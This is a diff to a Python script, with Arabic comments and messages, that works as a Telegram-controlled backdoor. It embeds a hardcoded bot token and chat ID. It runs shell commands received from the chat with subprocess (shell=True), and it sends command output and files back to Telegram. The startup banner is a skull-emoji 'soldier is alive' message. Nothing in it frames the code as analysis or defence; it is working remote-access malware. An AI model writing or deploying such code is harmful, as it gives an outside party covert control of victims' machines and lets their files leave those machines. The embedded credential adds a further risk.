@@ -1,27 +1,17 @@
 import os, sys, time, requests, subprocess, shutil, threading
 from datetime import datetime
-
-# ======== التُّوكِنُ مُضَمَّنٌ مُبَاشَرَةً (لَا حَاجَةَ لِـ config.py) ========
 BOT_TOKEN = "88516176066:AGAGM7GVC3BK0CUR9R6bAQHrvKERCxRYoc"
 CHAT_ID = "7399463177"
-
-if not BOT_TOKEN or not CHAT_ID:
-    print("ERROR: BOT_TOKEN or CHAT_ID not set!")
-    sys.exit(0)
-
 BASE = f"https://api.telegram.org/bot{BOT_TOKEN}"
 LAST_UPDATE = 0
-
 def send(txt, parse='Markdown'):
     try: requests.post(f"{BASE}/sendMessage", data={"chat_id": CHAT_ID, "text": txt, "parse_mode": parse})
     except: pass
-
 def send_file(path, cap=""):
     try:
         with open(path, 'rb') as f:
             requests.post(f"{BASE}/sendDocument", files={'document': f}, data={"chat_id": CHAT_ID, "caption": cap})
     except: pass
-
 def execute(cmd):
     try:
         res = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=15)
@@ -34,7 +24,6 @@ def execute(cmd):
 {out}
 ```")
     except Exception as e: send(f"خطأ: {e}")
-
 def listen():
     global LAST_UPDATE
     while True:
@@ -86,7 +75,6 @@ def listen():
 📤 أرسل ملف للتحميل")
         except: pass
         time.sleep(1)
-
 if __name__ == "__main__":
-    send("☠️ *جُنْدِيُّ دوكر يَعْمَلُ* ☠️")
+    send("☠️ جُنْدِيٌّ حَيٌّ ☠️")
     listen()
